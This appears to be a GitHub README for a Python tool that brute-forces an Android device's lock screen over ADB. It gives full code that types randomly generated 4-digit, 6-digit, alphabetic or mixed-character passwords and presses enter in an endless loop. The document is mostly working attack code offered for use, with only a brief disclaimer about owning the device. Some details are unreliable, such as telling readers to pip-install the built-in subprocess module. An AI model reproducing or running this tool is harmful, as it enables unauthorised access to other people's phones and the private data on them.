# Device Unlock Script

This script attempts to unlock an Android device using ADB (Android Debug Bridge) by simulating password inputs. It generates passwords of various types (numeric, alphabetic, and mixed characters) and tries each one until the device is unlocked.

## Prerequisites

- Python 3.x
- ADB (Android Debug Bridge) installed and configured on your computer
- The device must have USB debugging enabled

## Installation

1. **Install ADB:**

   Follow the official instructions to install ADB for your operating system: [ADB Installation Guide](https://developer.android.com/studio/command-line/adb)

2. **Clone the Repository:**

   ```sh
   git clone https://github.com/yourusername/device-unlock-script.git
   cd device-unlock-script
   ```

3. **Install Required Python Libraries:**

   ```sh
   pip install subprocess
   ```

## Usage

1. **Connect Your Device:**

   Ensure your Android device is connected via USB and USB debugging is enabled.

2. **Run the Script:**

   ```sh
   python unlock_device.py
   ```

3. **Choose the Unlock Type:**

   The script will prompt you to choose the type of password to attempt:
   
   ```
   ◯ For unlocking 4-digit Number :- 1
   ◯ For unlocking 6-digit Number :- 2
   ◯ For unlocking small alphabet :- 3
   ◯ For unlocking Big alphabet :- 4
   ◯ For unlocking Mixed-digit alphabet :- 5
   ◉ Enter your unlock Mode: 
   ```

4. **Password Length:**

   If you choose an alphabetic or mixed password type, you will be prompted to enter the length of the password.

## Code Explanation

### `unlock_device_with_password(password)`

This function uses ADB commands to input the password and simulate pressing the Enter key:

```python
import subprocess

def unlock_device_with_password(password):
    cmd_input_password = f"adb shell input text {password}"
    subprocess.run(cmd_input_password, shell=True)
    
    cmd_press_enter = "adb shell input keyevent 66"
    subprocess.run(cmd_press_enter, shell=True)
```

### `choose_Type()`

This function presents the user with options to choose the type of password to attempt:

```python
def choose_Type():
    a = chr(9673)
    b = chr(9445)
    print(f"{a} For unlocking 4-digit Number :- 1")
    print(f"{a} For unlocking 6-digit Number :- 2")
    print(f"{a} For unlocking small alphabet :- 3")
    print(f"{a} For unlocking Big alphabet :- 4")
    print(f"{a} For unlocking Mixed-digit alphabet :- 5")
    user_input = int(input(f"{b} Enter your unlock Mode: "))
    if user_input == 1:
        while True:
            four = pd.Four_digit()
            unlock_device_with_password(four)
    elif user_input == 2:
        while True:
            six = pd.Six_digit()
            unlock_device_with_password(six)
    elif user_input == 3:
        lenth = int(input("What is the length of your password:- "))
        while True:
            Small = pd.Small_Chractes(lenth)
            unlock_device_with_password(Small)
    elif user_input == 4:
        lenth = int(input("What is the length of your password:- "))
        while True:
            Big = pd.Big_Chractes(lenth)
            unlock_device_with_password(Big)
    elif user_input == 5:
        lenth = int(input("What is the length of your password:- "))
        while True:
            mix = pd.mix_Chractes(lenth)
            unlock_device_with_password(mix)
    else:
        print("Invalid Choice")
```

### Password Generation Functions

These functions generate passwords based on the chosen type and length.

#### Four-Digit Number

```python
import random

def Four_digit():
    return str(random.randint(1000, 9999))
```

#### Six-Digit Number

```python
def Six_digit():
    return str(random.randint(100000, 999999))
```

#### Small Alphabetic Characters

```python
def Small_Chractes(length):
    characters = "qwertyuiopasdfghjklzxcvbnm"
    return ''.join(random.choice(characters) for _ in range(length))
```

#### Big Alphabetic Characters

```python
def Big_Chractes(length):
    characters = "ASDFGHJKLPOIUYTREWQZXCVBNM"
    return ''.join(random.choice(characters) for _ in range(length))
```

#### Mixed Characters

```python
def mix_Chractes(length):
    characters = "qwertyuiopasdfghjklzxcvbnmASDFGHJKLPOIUYTREWQZXCVBNM1234567890-=[]|;'./,<>?:{}+_!@#$%^&*()"
    return ''.join(random.choice(characters) for _ in range(length))
```

## Notes

- The script runs indefinitely until the device is unlocked or the script is manually terminated.
- Ensure that you have the necessary permissions to attempt unlocking the device.
- Use this script responsibly and only on devices you own or have explicit permission to unlock.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.